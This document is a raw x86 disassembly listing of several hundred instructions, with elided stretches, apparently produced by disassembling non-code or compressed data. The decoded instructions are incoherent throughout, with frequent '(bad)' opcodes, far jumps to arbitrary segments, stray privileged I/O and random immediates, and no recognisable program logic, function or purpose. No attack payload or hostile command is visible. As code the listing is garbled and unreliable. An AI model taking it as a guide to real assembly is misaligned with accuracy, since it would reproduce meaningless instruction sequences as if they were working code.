  421a5e:	xor    dh,dl
  421a60:	(bad)  
  421a61:	mov    WORD PTR [edi+0x5],es
  421a64:	test   al,0xbe
  421a66:	loopne 0x421aa8
  421a68:	or     dl,ah
  421a6a:	pop    eax
  421a6b:	outs   dx,DWORD PTR ds:[esi]
  421a6c:	popa   
  421a6d:	dec    ebp
  421a6e:	cli    
  421a6f:	sub    eax,0xab3cc894
  421a74:	sbb    al,dh
  421a76:	hlt    
  421a77:	push   ecx
  421a78:	repnz inc ecx
  421a7a:	cmp    eax,0xb028b34a
  421a7f:	or     eax,0xeacea7ad
  421a84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421a85:	out    dx,al
  421a86:	aad    0xe8
  421a88:	and    DWORD PTR [eax],0x28aa5652
  421a8e:	mov    al,0x8e
  421a90:	sbb    DWORD PTR [ebp+0x18656cdf],eax
  421a96:	mov    ds:0x418d1ad8,al
  421a9b:	xor    DWORD PTR [eax+0x343febf3],esp
  421aa1:	xchg   edx,eax
  421aa2:	adc    ebp,DWORD PTR [ecx+ebp*1-0x44]
  421aa6:	retf   
  421aa7:	push   0x65
  421aa9:	sub    BYTE PTR [esi],dh
  421aab:	fisttp QWORD PTR [edi-0x6dd7a7d8]
  421ab1:	push   0xffffffa4
  421ab3:	mov    esp,DWORD PTR [esi+0x6]
  421ab6:	test   al,0xd4
  421ab8:	mov    BYTE PTR [ecx+eax*4-0x4f],dl
  421abc:	leave  
  421abd:	push   ds
  421abe:	adc    eax,0x39ddc954
  421ac3:	pop    edx
  421ac4:	(bad)  
  421ac6:	addr16 repz push 0xa6143436
  421acd:	jmp    0x11975a1c
  421ad2:	jb     0x421ab9
  421ad4:	std    
  421ad5:	pop    eax
  421ad6:	pop    ebx
  421ad7:	push   edi
  421ad8:	add    eax,0xbafd1b28
  421add:	div    BYTE PTR fs:[eax]
  421ae0:	mov    ebp,0x2265fde9
  421ae5:	mov    esi,0xdcce8785
  421aea:	jmp    0x6f6c173a
  421aef:	sbb    ah,BYTE PTR [edx-0x3d]
  421af2:	adc    eax,DWORD PTR [edx]
  421af4:	aaa    
  421af5:	or     BYTE PTR [edx],dl
  421af7:	jg     0x421b34
  421af9:	jge    0x421b03
  421afb:	clc    
  421afc:	jle    0x421b48
  421afe:	in     al,0xb2
  421b00:	add    dh,BYTE PTR es:0x9ffed90d
  421b07:	(bad)  
  421b08:	js     0x421b3f
  421b0a:	sub    DWORD PTR [ebx+0xe6bc67c],esi
	...
  421b74:	push   ss
  421b75:	cdq    
  421b76:	jmp    0x37400b48
  421b7b:	fild   DWORD PTR [ecx+eax*8+0x28]
  421b7f:	or     bh,BYTE PTR [esi-0x71]
  421b82:	push   esi
  421b83:	call   0x104:0x16728
  421b8a:	add    BYTE PTR [eax],al
  421b8c:	repnz push ebp
  421b8e:	loope  0x421b51
  421b90:	jmp    0x6c0f:0x1c5d205b
  421b97:	rcr    BYTE PTR ds:0x36ce11df,cl
  421b9d:	sub    BYTE PTR [edi+0x7daa3443],dl
  421ba3:	int3   
  421ba4:	jg     0x421c17
  421ba6:	(bad)  
  421ba7:	xor    cl,BYTE PTR [esi+eax*1-0x59]
  421bab:	hlt    
  421bac:	push   ebx
  421bad:	fsub   DWORD PTR [eax+0x3c]
  421bb0:	jmp    0x421b47
  421bb2:	adc    esp,edx
  421bb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421bb5:	aam    0xec
  421bb7:	xchg   bh,ah
  421bb9:	sub    DWORD PTR [edx+eax*2-0x6f],0x67
  421bbe:	or     al,0x5c
  421bc0:	sbb    ah,dh
  421bc2:	push   edx
  421bc3:	lds    eax,FWORD PTR [ebp+esi*8-0x74]
  421bc7:	fcom   QWORD PTR [esi]
  421bc9:	inc    eax
  421bca:	cld    
  421bcb:	jmp    0xda72:0xea1c0ed6
  421bd2:	aaa    
  421bd3:	in     eax,dx
  421bd4:	adc    al,0xc6
  421bd6:	es pop esp
  421bd8:	inc    ebp
  421bd9:	dec    esi
  421bda:	xchg   esp,eax
  421bdb:	repz pop esi
  421bdd:	mov    ?,edx
  421bdf:	ret    0x37de
  421be2:	repnz scas eax,DWORD PTR es:[edi]
  421be4:	jb     0x421b97
  421be6:	(bad)  
  421be7:	adc    bh,bh
  421be9:	pop    ss
  421bea:	mov    ds:0x23bf72e4,al
  421bef:	out    dx,al
  421bf0:	imul   DWORD PTR [eax+0x585520c7]
  421bf6:	jge    0x421bc8
  421bf8:	int    0x1c
  421bfa:	add    eax,0xdbffaf52
  421bff:	push   ss
  421c00:	adc    BYTE PTR [edi-0x4c],bh
  421c03:	adc    cl,BYTE PTR [ecx-0x4ea643a5]
  421c09:	pop    edi
  421c0a:	lods   eax,DWORD PTR ds:[esi]
  421c0b:	add    esi,DWORD PTR [ebp-0x69]
  421c0e:	push   cs
  421c0f:	jp     0x421c1e
  421c11:	repz out 0x52,al
  421c14:	mov    esi,0x84d0a67f
  421c19:	stos   BYTE PTR es:[edi],al
  421c1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c1b:	dec    esp
  421c1c:	mov    WORD PTR [esp+eax*4-0x79],cs
  421c20:	in     al,dx
  421c21:	test   eax,0x38d96228
  421c26:	cdq    
  421c27:	xchg   ebx,eax
  421c28:	test   al,0x37
  421c2a:	mov    ?,WORD PTR [edi+0x268f4f5c]
  421c30:	in     al,dx
  421c31:	popf   
  421c32:	(bad)  
  421c33:	loopne 0x421c12
  421c35:	pusha  
  421c36:	sbb    ebx,DWORD PTR [edx+0x1a]
  421c39:	push   ds
  421c3a:	adc    DWORD PTR [ecx],esp
  421c3c:	ud0    ecx,DWORD PTR [edi-0x4e]
  421c40:	jle    0x421c7e
  421c42:	dec    eax
  421c43:	jp     0x421c1a
  421c45:	mov    DWORD PTR [esi+0x53],ebx
  421c48:	iret   
  421c49:	cmp    bh,cl
  421c4b:	imul   esi,DWORD PTR [edx-0x6568f812],0x67
  421c52:	(bad)  
  421c53:	int    0x1
  421c55:	ret    
  421c56:	xor    ebp,esi
  421c58:	mov    ebx,0x2e43a84a
  421c5d:	push   esp
  421c5e:	in     al,0xe
  421c60:	cmp    ch,BYTE PTR [ecx-0x2e]
  421c63:	or     al,0xcc
  421c65:	inc    edi
  421c66:	mov    bl,0xd
  421c68:	daa    
  421c69:	jle    0x421c02
  421c6b:	aaa    
  421c6c:	xchg   dh,al
  421c6e:	(bad)
  421c71:	icebp  
  421c72:	(bad)  
  421c73:	dec    esp
  421c74:	push   ebx
  421c75:	outs   dx,DWORD PTR ds:[esi]
  421c76:	ins    BYTE PTR es:[edi],dx
  421c77:	xchg   ebx,eax
  421c78:	or     edi,edi
  421c7a:	dec    eax
  421c7b:	mov    DWORD PTR [edi+0x33],esp
  421c7e:	xchg   esi,eax
  421c7f:	lods   al,BYTE PTR ds:[esi]
  421c80:	add    ebp,DWORD PTR [ecx]
  421c82:	outs   dx,BYTE PTR ds:[esi]
  421c83:	(bad)  
  421c84:	(bad)  
  421c86:	cmp    al,0xe7
  421c88:	or     al,0x77
  421c8a:	inc    esp
  421c8b:	xor    BYTE PTR [ebp-0x63],dl
  421c8e:	out    dx,eax
  421c8f:	out    dx,al
	...
  421cf4:	mov    al,0x6b
  421cf6:	mov    ch,0xe5
  421cf8:	(bad)  
  421cf9:	push   eax
  421cfb:	jg     0x421d51
  421cfd:	dec    edi
  421cfe:	xchg   edx,eax
  421cff:	dec    edi
  421d00:	popf   
  421d01:	sbb    BYTE PTR [edx-0x72],ah
  421d04:	sub    al,0x68
  421d06:	add    DWORD PTR [eax],eax
  421d08:	add    al,0x1
  421d0a:	add    BYTE PTR [eax],al
  421d0c:	xor    eax,0x9995d948
  421d11:	out    dx,al
  421d12:	test   BYTE PTR [ecx+0x21],ah
  421d15:	jo     0x421cbe
  421d17:	mov    edi,0x75b8c26
  421d1c:	sub    ebx,0x8afd3a2
  421d22:	dec    ebp
  421d23:	(bad)  
  421d24:	in     eax,dx
  421d25:	iret   
  421d26:	rol    DWORD PTR [eax+0x42de14c8],1
  421d2c:	cmp    eax,0xdc1b97d6
  421d31:	mov    DWORD PTR [esi+eiz*8+0x2b3a40c4],ebx
  421d38:	into   
  421d39:	repnz mov ch,0x2e
  421d3c:	out    0x5a,al
  421d3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d3f:	pop    ecx
  421d40:	cwde   
  421d41:	iret   
  421d42:	shl    ch,1
  421d44:	ret    0xef2e
  421d47:	rdtsc  
  421d49:	inc    esi
  421d4a:	aaa    
  421d4b:	lds    edx,FWORD PTR [ebp-0x1940e950]
  421d51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d53:	jno    0x421dc4
  421d55:	jecxz  0x421daf
  421d57:	lods   eax,DWORD PTR ds:[esi]
  421d58:	leave  
  421d59:	cld    
  421d5a:	mov    bh,0x12
  421d5c:	sbb    al,0xe
  421d5e:	xchg   ebp,eax
  421d5f:	jp     0x421d54
  421d61:	or     bh,ch
  421d63:	fldcw  WORD PTR [edi+0x21]
  421d66:	lock pop ss
  421d68:	cwde   
  421d69:	adc    BYTE PTR [ebx-0x6afaf72a],ah
  421d6f:	or     eax,0xfcff754f
  421d74:	call   0xdcbf14c
  421d79:	call   0xce89cb39
  421d7e:	pop    ds
  421d7f:	push   es
  421d80:	xor    al,0x8e
  421d82:	fst    DWORD PTR [eax+0x5f786230]
  421d88:	add    BYTE PTR [ebx],dh
  421d8a:	pop    ebx
  421d8b:	inc    ebx
  421d8c:	adc    eax,0x43224005
  421d91:	sub    DWORD PTR [ebp-0x4b],ecx
  421d94:	adc    BYTE PTR ds:0xb4c7fa07,ch
  421d9a:	dec    ebp
  421d9b:	(bad)  
  421d9c:	jmp    0xfb7e:0x96610fa6
  421da3:	xchg   edx,eax
  421da4:	enter  0x2f9a,0xf7
  421da8:	sbb    esp,ebx
  421daa:	mov    ds,WORD PTR [ebp+edx*1-0x2eec4dc1]
  421db1:	div    BYTE PTR [eax-0x22]
  421db4:	xchg   ebp,eax
  421db5:	retf   0xa31a
  421db8:	or     eax,0x3ced8680
  421dbd:	mov    ds:0xf6bb2c9a,eax
  421dc2:	jne    0x421e29
  421dc4:	jns    0x421e15
  421dc6:	push   ds
  421dc7:	jge    0x421e18
  421dc9:	xchg   esp,eax
  421dca:	add    al,0xc2
  421dcc:	mov    esi,0x9ae78bd5
  421dd1:	dec    esi
  421dd2:	cmp    al,BYTE PTR [edi+0xa4d3c5f]
  421dd8:	js     0x421e37
  421dda:	cli    
  421ddb:	lds    ecx,FWORD PTR [ebp-0x1c3f3b5]
  421de1:	jg     0x421d8f
  421de3:	das    
  421de4:	xor    eax,0x45a62ac9
  421de9:	xchg   edx,eax
  421dea:	xchg   DWORD PTR [esi-0x3f],ecx
  421ded:	hlt    
  421dee:	je     0x421d9e
  421df0:	cmp    al,0x8c
  421df2:	mov    esi,0x9231c2ae
  421df7:	inc    esp
  421df8:	or     DWORD PTR [ebx],ebp
  421dfa:	sub    BYTE PTR [eax],dl
  421dfc:	adc    eax,0x5d49ae8a
  421e01:	xchg   edi,eax
  421e02:	or     esi,eax
  421e04:	xchg   edx,eax
  421e05:	jge    0x421e63
  421e07:	mov    bh,0xd7
  421e09:	(bad)  
  421e0a:	retf   0x2116
  421e0d:	jo     0x421d93
  421e0f:	cmp    eax,0x0
	...
  421e74:	iret   
  421e75:	mov    eax,ds:0xbf7f851b
  421e7a:	fucomip st,st(3)
  421e7c:	push   es
  421e7d:	ins    BYTE PTR es:[edi],dx
  421e7e:	xor    al,0xb9
  421e80:	outs   dx,DWORD PTR ds:[esi]
  421e81:	repz rol DWORD PTR [ecx],0x30
  421e85:	imul   eax,DWORD PTR [ecx],0x10400
  421e8b:	add    BYTE PTR [edx+edi*2-0x17],ch
  421e8f:	cmc    
  421e90:	or     DWORD PTR [edi-0x17],edi
  421e93:	test   ebp,esi
  421e95:	ja     0x421eaa
  421e97:	push   cs
  421e98:	xor    DWORD PTR ds:[eax-0x4d],0xffffffd8
  421e9d:	fcmovb st,st(0)
  421e9f:	test   dh,0x5
  421ea2:	(bad)  
  421ea3:	cmp    al,0xed
  421ea5:	jge    0x421e8b
  421ea7:	sti    
  421ea8:	fst    DWORD PTR [esi+0x66]
  421eab:	mov    eax,DWORD PTR [eax+0x3e326c79]
  421eb1:	cld    
  421eb2:	push   ebp
  421eb3:	loopne 0x421e82
  421eb5:	adc    bl,al
  421eb7:	xchg   esi,eax
  421eb8:	pop    esi
  421eb9:	sub    eax,0x6a0b4b85
  421ebe:	mov    cl,0x7e
  421ec0:	cdq    
  421ec1:	xchg   esi,eax
  421ec2:	push   ebp
  421ec3:	push   esi
  421ec4:	jb     0x421f33
  421ec6:	int    0x51
  421ec8:	xor    BYTE PTR [ebp-0x6e55157c],al
  421ece:	jne    0xb1500433
  421ed4:	popa   
  421ed5:	xchg   esi,eax
  421ed6:	mov    BYTE PTR [ebx+edx*2-0x69],ch
  421eda:	sub    cl,BYTE PTR [ebp+0x46]
  421edd:	pop    ss
  421ede:	and    dh,BYTE PTR [eax]
  421ee0:	dec    edx
  421ee1:	mov    esi,0xc0c9ffe0
  421ee6:	pop    es
  421ee7:	push   edx
  421ee8:	cmc    
  421ee9:	aaa    
  421eea:	sub    al,0x9c
  421eec:	fisubr WORD PTR [edx+0x51bd0978]
  421ef2:	pop    ebx
  421ef3:	adc    DWORD PTR [ecx-0x58d249fb],ecx
  421ef9:	ins    DWORD PTR es:[edi],dx
  421efa:	cmp    DWORD PTR [ecx],esp
  421efc:	loope  0x421ed8
  421efe:	rcr    DWORD PTR [ebx+0x47],1
  421f01:	sbb    eax,0x37140577
  421f06:	repz xchg ecx,eax
  421f08:	or     BYTE PTR [esi+0x548170e0],dl
  421f0e:	repz rol BYTE PTR [edi],1
  421f11:	sahf   
  421f12:	xchg   ecx,eax
  421f13:	push   edi
  421f14:	adc    BYTE PTR [eax-0x13],0x83
  421f18:	sub    DWORD PTR [ebx+0x4c],ebp
  421f1b:	pop    ss
  421f1c:	push   ecx
  421f1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f1e:	mov    dl,0x3a
  421f20:	and    al,BYTE PTR [edi+0x43]
  421f23:	sahf   
  421f24:	nop
  421f25:	pop    esp
  421f26:	sub    DWORD PTR [eax+0xa],esp
  421f29:	adc    edx,DWORD PTR [edi]
  421f2b:	fnstenv [ebx]
  421f2d:	xor    ecx,DWORD PTR [eax-0x4]
  421f30:	frstor [edi-0x2afb29aa]
  421f36:	sub    ch,BYTE PTR [eax-0x605d4a83]
  421f3c:	mov    ebx,0x1598bcb4
  421f41:	pop    ebx
  421f42:	pop    esi
  421f43:	loop   0x421f4c
  421f45:	inc    ebp
  421f46:	push   esi
  421f47:	addr16 inc edi
  421f49:	cmc    
  421f4a:	dec    ebp
  421f4b:	mov    ebx,0xf459ca17
  421f50:	cmp    BYTE PTR [eax+0x65a5c12d],ch
  421f56:	cmp    ebx,DWORD PTR [edx+0x3b]
  421f59:	fcmovnb st,st(6)
  421f5b:	mov    WORD PTR [esp+edx*8],ax
  421f5f:	mov    edx,0x49691f33
  421f64:	xor    eax,0x8fa1ddb9
  421f69:	cmp    ch,BYTE PTR [ebx]
  421f6b:	sub    BYTE PTR [eax+0x3e],dl
  421f6e:	inc    ebp
  421f6f:	stos   BYTE PTR es:[edi],al
  421f70:	fstp   DWORD PTR [ecx+0x5647199e]
  421f76:	outs   dx,BYTE PTR ds:[esi]
  421f77:	add    ecx,ecx
  421f79:	ja     0x421f06
  421f7b:	in     al,0xe1
  421f7d:	sar    BYTE PTR [edx+0x1f7d0ec2],1
  421f83:	inc    edi
  421f84:	jb     0x421f0e
  421f86:	or     eax,0xa33b13ef
  421f8b:	leave  
  421f8c:	mov    ecx,0x323664
	...
  421ff1:	add    BYTE PTR [eax],al
  421ff3:	add    BYTE PTR [ebx+0x6],ch
  421ff6:	(bad)  
  421ff7:	dec    edi
  421ff8:	out    dx,eax
  421ff9:	iret   
  421ffa:	jmp    0x422022
  421ffc:	aas    
  421ffd:	in     eax,dx
  421ffe:	push   es
  421fff:	retw   0x1923
  422003:	hlt    
  422004:	xor    al,0x6a
  422006:	add    DWORD PTR [eax],eax
  422008:	add    al,0x1
  42200a:	add    BYTE PTR [eax],al
  42200c:	arpl   WORD PTR [esi+0x2a7fea7e],ax
  422012:	cmp    al,0x3c
  422014:	pusha  
  422015:	imul   esi,DWORD PTR [edi],0x14
  422018:	sub    eax,0xb9809029
  42201d:	push   0x3c09fb39
  422022:	out    dx,al
  422023:	addr16 push ecx
  422025:	pop    eax
  422026:	shr    BYTE PTR [edx+0x2d],0x13
  42202a:	in     al,dx
  42202b:	in     al,0x17
  42202d:	push   ebp
  42202e:	inc    esi
  42202f:	fcom   DWORD PTR [esi]
  422031:	push   ebp
  422032:	aas    
  422033:	cmp    al,0xa9
  422035:	in     al,0x36
  422037:	xor    eax,0x4fb541f1
  42203c:	dec    ebp
  42203d:	cmp    al,0x85
  42203f:	iret   
  422040:	lds    ecx,FWORD PTR gs:[ecx+0x49a6eb68]
  422047:	js     0x421fcf
  422049:	cli    
  42204a:	mov    bh,0xb
  42204c:	in     al,0x7d
  42204e:	xchg   ebx,eax
  42204f:	adc    eax,0x9296b3fb
  422054:	mov    ch,0xf6
  422056:	rol    ch,1
  422058:	ror    bh,cl
  42205a:	aam    0x6b
  42205c:	sar    DWORD PTR [ebp-0x10b94f94],cl
  422062:	(bad)
  422065:	dec    esi
  422066:	aam    0xaa
  422068:	sub    al,0x7a
  42206a:	mov    WORD PTR [ebp+0x399b708a],?
  422070:	push   0xffffffa1
  422072:	pop    edi
  422073:	jp     0x4220d6
  422075:	lods   al,BYTE PTR ds:[esi]
  422076:	inc    esi
  422077:	ror    DWORD PTR [eax],1
  422079:	(bad)  
  42207a:	push   esp
  42207b:	loop   0x4220e5
  42207d:	shr    BYTE PTR [ecx+eax*1-0x23d10c7],cl
  422084:	pop    ebx
  422085:	xchg   BYTE PTR [ecx-0x7d980d7a],ah
  42208b:	or     dh,dl
  42208d:	das    
  42208e:	sub    al,BYTE PTR [ebp+0x2]
  422091:	adc    BYTE PTR [edi-0x397705ec],bh
  422097:	jg     0x422057
  422099:	scas   eax,DWORD PTR es:[edi]
  42209a:	pop    esp
  42209b:	cmc    
  42209c:	mov    bl,0x58
  42209e:	pop    ss
  42209f:	nop
  4220a0:	xor    DWORD PTR fs:[ebx],0x4f
  4220a4:	push   edx
  4220a5:	and    ecx,DWORD PTR [edi-0x631f31da]
  4220ab:	dec    ebx
  4220ac:	into   
  4220ad:	adc    DWORD PTR [ecx],edx
  4220af:	dec    esi
  4220b0:	test   eax,0x894f13d4
  4220b5:	jmp    0x7bad4abf
  4220ba:	pop    edi
  4220bb:	not    ah
  4220bd:	stos   DWORD PTR es:[edi],eax
  4220be:	bound  ebp,QWORD PTR [ecx+ebp*1+0x1b]
  4220c2:	sbb    cl,BYTE PTR [edi]
  4220c4:	pop    edx
  4220c5:	dec    ebp
  4220c6:	int    0x94
  4220c8:	es jo  0x4220ff
  4220cb:	or     cl,BYTE PTR [edi]
  4220cd:	daa    
  4220ce:	mov    esp,0xfc56669b
  4220d3:	mov    ebx,DWORD PTR [edx]
  4220d5:	aad    0xd0
  4220d7:	mov    al,BYTE PTR [edi+0x7aaa0776]
  4220dd:	or     BYTE PTR [edx-0x5c80b4ee],ch
  4220e3:	outs   dx,BYTE PTR ds:[esi]
  4220e4:	sub    al,0x7e
  4220e6:	mov    eax,ds:0x4b842005
  4220eb:	mov    eax,0xc1127261
  4220f0:	or     bl,0xa3
  4220f3:	mov    eax,0x5a5c140e
  4220f8:	or     al,0x67
  4220fa:	xor    al,0x98
  4220fc:	ja     0x422097
  4220fe:	test   DWORD PTR [edx+0x61],esp
  422101:	daa    
  422102:	arpl   di,sp
  422104:	cli    
  422105:	sbb    eax,0x9c976d5a
  42210a:	mov    dh,0xa3
  42210c:	jecxz  0x42209b
  42210e:	inc    ecx
  42210f:	ins    DWORD PTR es:[edi],dx
	...
  422174:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422175:	push   edx
  422176:	jnp    0x422175
  422178:	(bad)  
  422179:	std    
  42217a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42217b:	pop    ebx
  42217c:	dec    edx
  42217d:	sub    al,0x42
  42217f:	sub    esp,DWORD PTR [ebx+esi*2+0x43]
  422183:	hlt    
  422184:	cmp    BYTE PTR [ebx+0x1],ch
  422187:	add    BYTE PTR [ecx+eax*1],al
  42218a:	add    BYTE PTR [eax],al
  42218c:	dec    edx
  42218d:	sub    al,0x72
  42218f:	test   eax,0x74cf32c3
  422194:	inc    ecx
  422195:	adc    DWORD PTR [esi+eiz*2],esp
  422198:	sub    DWORD PTR [ecx+0x62],0x50a51a6b
  42219f:	push   cs
  4221a0:	push   eax
  4221a1:	sub    BYTE PTR [edi],dl
  4221a3:	push   edi
  4221a4:	sar    BYTE PTR [edx+0x26],1
  4221a7:	scas   al,BYTE PTR es:[edi]
  4221a8:	test   edx,ebp
  4221aa:	pop    ss
  4221ab:	adc    eax,0x2b495eae
  4221b0:	xor    esi,DWORD PTR [esi+ebx*2-0x39739593]
  4221b7:	pop    ebx
  4221b8:	out    0xa8,eax
  4221ba:	imul   ecx,DWORD PTR [eax+edi*4-0x73],0x1e38755b
  4221c2:	pop    esp
  4221c3:	mov    WORD PTR [eax+ebx*8-0x7d],cs
  4221c7:	dec    ebp
  4221c8:	mov    dh,0xcc
  4221ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221cb:	(bad)  
  4221cc:	pop    esi
  4221cd:	scas   al,BYTE PTR es:[edi]
  4221ce:	pop    es
  4221cf:	xlat   BYTE PTR ds:[ebx]
  4221d0:	pop    ebx
  4221d1:	dec    ebx
  4221d2:	mov    bh,0x9f
  4221d4:	sbb    eax,0xff2b437d
  4221d9:	orps   xmm2,XMMWORD PTR [esi-0x151fcb6a]
  4221e0:	stos   DWORD PTR es:[edi],eax
  4221e1:	push   eax
  4221e2:	pop    ebx
  4221e3:	out    0x48,eax
  4221e5:	sbb    eax,0x4cc42c0a
  4221ea:	lds    eax,FWORD PTR [edi-0x10]
  4221ed:	push   eax
  4221ee:	mov    ds:0xd422e27d,eax
  4221f3:	inc    edx
  4221f4:	add    esp,edx
  4221f6:	sub    DWORD PTR [edx+0x788be5a2],0x65
  4221fd:	add    eax,0x20cfbaa2
  422202:	test   BYTE PTR [edx+0x50],dl
  422205:	and    ebp,edi
  422207:	mov    bh,BYTE PTR [ebx+0x5d]
  42220a:	inc    ebp
  42220b:	xor    BYTE PTR [ebx],ah
  42220d:	sbb    BYTE PTR [esi],ah
  42220f:	add    eax,0xd994ed14
  422214:	pop    es
  422215:	lods   eax,DWORD PTR ds:[esi]
  422216:	pushf  
  422217:	lea    eax,[ecx-0x13]
  42221a:	jne    0x422224
  42221c:	arpl   WORD PTR [edi],di
  42221e:	sbb    eax,0x9f54cd7c
  422223:	test   DWORD PTR [edi],edx
  422225:	std    
  422226:	sahf   
  422227:	ror    BYTE PTR [edx-0x36413a90],cl
  42222d:	jb     0x422236
  42222f:	int3   
  422230:	(bad)  
  422231:	int    0x18
  422233:	(bad)  
  422234:	pop    ecx
  422235:	inc    eax
  422236:	clc    
  422237:	and    DWORD PTR [ecx],eax
  422239:	or     eax,0xae12477d
  42223e:	xchg   edx,eax
  42223f:	retf   
  422240:	pop    ss
  422241:	adc    edx,DWORD PTR [edi+0x34e250f8]
  422247:	pushf  
  422248:	test   al,0xa5
  42224a:	aaa    
  42224b:	retf   0xc3ba
  42224e:	jbe    0x4221f6
  422250:	sbb    eax,DWORD PTR [edx+edx*2+0x2958187e]
  422257:	dec    ecx
  422258:	sub    eax,0xf4203788
  42225d:	mov    bh,0xa1
  42225f:	adc    ch,BYTE PTR ds:0xe4a148a0
  422265:	xchg   esp,eax
  422266:	mov    BYTE PTR [eax+edi*4-0x1d94dd92],bl
  42226d:	adc    eax,0xd15c0895
  422272:	adc    eax,DWORD PTR [eax+0x2d]
  422275:	xor    al,0x4d
  422277:	in     eax,dx
  422278:	into   
  422279:	or     DWORD PTR ds:0x62913d24,ecx
  42227f:	mov    ebx,0xd0043b50
  422284:	push   edx
  422285:	jae    0x422300
  422287:	out    dx,al
  422288:	retf   
  422289:	ror    DWORD PTR [edi],cl
  42228b:	jns    0x4222b9
  42228d:	jg     0x422253
  42228f:	dec    esp
	...
  4222f4:	(bad)  
  4222f5:	in     eax,dx
  4222f6:	lods   eax,DWORD PTR ds:[esi]
  4222f7:	imul   edi
  4222f9:	neg    edi
  4222fb:	std    
  4222fc:	sub    ebx,DWORD PTR [ebp+0x71]
  4222ff:	dec    ecx
  422300:	inc    esp
  422301:	push   edx
  422302:	fmul   st,st(0)
  422304:	cmp    al,0x6c
  422306:	add    DWORD PTR [eax],eax
  422308:	add    al,0x1
  42230a:	add    BYTE PTR [eax],al
  42230c:	xchg   edx,eax
  42230d:	(bad)  
  42230e:	fist   DWORD PTR [esi+0x3e]
  422311:	retf   0x9da2
  422314:	mov    esp,DWORD PTR [ecx+ebx*1-0x17]
  422318:	xchg   ebp,eax
  422319:	mov    WORD PTR [edi],es
  42231b:	sbb    al,0xa5
  42231d:	retf   
  42231e:	aas    
  42231f:	push   esi
  422320:	jge    0x422323
  422322:	movd   DWORD PTR [edi],mm3
  422325:	call   0xfbd1:0x3898c2e
  42232c:	pop    eax
  42232d:	jmp    0x8041:0x60970498
  422334:	(bad)  
  422335:	and    al,BYTE PTR [ebp-0x53]
  422338:	jo     0x422317
  42233a:	aad    0xbe
  42233c:	inc    ebp
  42233d:	or     bh,ah
  42233f:	fnstcw WORD PTR [ebx]
  422341:	out    0xdf,eax
  422343:	push   esp
  422344:	pop    ebp
  422345:	mov    ds:0xd1cb93b4,al
  42234a:	out    dx,eax
  42234b:	pushf  
  42234c:	push   ds
  42234d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42234e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42234f:	test   BYTE PTR [ebx],0xb9
  422352:	cs sbb ecx,ebp
  422355:	aad    0x38
  422357:	add    al,0x4f
  422359:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42235a:	mov    BYTE PTR [ebp+0x437bfd98],bl
  422360:	aas    
  422361:	outs   dx,BYTE PTR ds:[esi]
  422362:	lods   eax,DWORD PTR ds:[esi]
  422363:	int3   
  422364:	loop   0x4223b8
  422366:	mov    ch,0x92
  422368:	lea    eax,[ebx-0x77dd2fe8]
  42236e:	xor    al,0xc2
  422370:	add    al,0xf9
  422372:	(bad)  
  422374:	mov    esi,0x1b8ac7aa
  422379:	iret   
  42237a:	rcr    DWORD PTR ss:[esp+eax*4-0xc19a4b],1
  422382:	add    BYTE PTR [ebp-0x3407f14b],al
  422388:	mov    dh,0x9b
  42238a:	pop    ss
  42238b:	add    BYTE PTR [eax+ecx*4-0x2bf8d9b8],ah
  422392:	pop    ds
  422393:	ret    0x70d1
  422396:	cmp    ecx,DWORD PTR [eax+0x70664646]
  42239c:	sahf   
  42239d:	imul   edi,ecx,0x1
  4223a0:	push   0x2f
  4223a2:	jno    0x422330
  4223a4:	sub    BYTE PTR [esi],dl
  4223a6:	jmp    0xb01600f9
  4223ab:	push   0xffffffa1
  4223ad:	jno    0x4223c3
  4223af:	std    
  4223b0:	sbb    al,al
  4223b2:	imul   edi,DWORD PTR [esi-0x9],0x48d492c5
  4223b9:	and    eax,0x45342915
  4223be:	xor    eax,0x2c26817a
  4223c3:	dec    edx
  4223c4:	fucomip st,st(0)
  4223c6:	aad    0x21
  4223c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223c9:	pushf  
  4223ca:	stos   BYTE PTR es:[edi],al
  4223cb:	mov    ah,bh
  4223cd:	sbb    bh,dh
  4223cf:	popa   
  4223d0:	jecxz  0x42238f
  4223d2:	(bad)  
  4223d4:	pusha  
  4223d5:	test   al,0xe6
  4223d7:	test   eax,0xc6be3afe
  4223dc:	cdq    
  4223dd:	add    al,0xa
  4223df:	daa    
  4223e0:	stc    
  4223e1:	add    ah,cl
  4223e3:	jmp    0x86db:0x72d73beb
  4223ea:	outs   dx,BYTE PTR ds:[esi]
  4223eb:	ss add dl,bl
  4223ee:	(bad)  
  4223ef:	and    esp,DWORD PTR [edi+0x2e]
  4223f2:	icebp  
  4223f3:	mov    al,0xaf
  4223f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223f7:	jl     0x4223c6
  4223f9:	addr16 pop edi
  4223fb:	mov    dh,0xf9
  4223fd:	add    eax,0xff9032d
  422402:	and    eax,0x63968689
  422407:	outs   dx,BYTE PTR ds:[esi]
  422408:	dec    ecx
  422409:	popa   
  42240a:	sub    edi,ebp
  42240c:	arpl   WORD PTR [esi+0xc904],si
	...
  422472:	add    BYTE PTR [eax],al
  422474:	push   edx
  422475:	sub    BYTE PTR [esi],0x69
  422478:	(bad)  
  422479:	in     eax,dx
  42247a:	push   edi
  42247b:	mov    ebx,0x99e531bb
  422480:	dec    ebx
  422481:	jecxz  0x4224be
  422483:	dec    edi
  422484:	inc    eax
  422485:	ins    DWORD PTR es:[edi],dx
  422486:	add    DWORD PTR [eax],eax
  422488:	add    al,0x1
  42248a:	add    BYTE PTR [eax],al
  42248c:	mov    dl,0x1e
  42248e:	sar    DWORD PTR ds:[ebp-0x384bc83f],1
  422495:	jecxz  0x422434
  422497:	sar    DWORD PTR [esi+0x613e454a],1
